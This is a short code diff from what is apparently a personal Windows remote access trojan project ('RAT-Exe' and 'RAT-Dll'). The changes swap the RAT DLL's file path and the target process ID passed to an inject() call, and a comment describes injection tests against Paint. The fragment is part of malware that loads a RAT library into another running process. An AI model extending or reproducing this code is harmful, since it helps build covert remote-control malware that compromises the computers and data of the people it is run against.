@@ -13,7 +13,7 @@ INT main()
     DWORD dwBytesRead = 0;
     CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
     LARGE_INTEGER fileSize;
-    LPCSTR filePath = "C:\\Users\\Admin\\Projects\\Personal\\Windows-RAT\\RAT-Dll\\x64\\Debug\\RAT-Dll.dll";
+    LPCSTR filePath = "C:\\RAT-Dll.dll";
     DWORD lastError, bufferSize;
     LPCWSTR dllName = DLL_NAME;
     HMODULE hGetProcIDLL = LoadLibrary(dllName);
@@ -82,7 +82,7 @@ INT main()
     
     // lets just test inject first to get that working 
         // paint inject test 
-    status = inject(24512, bufferSize, fileBytes);
+    status = inject(4480, bufferSize, fileBytes);
     if (status != ERROR_SUCCESS)
     {
         printf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
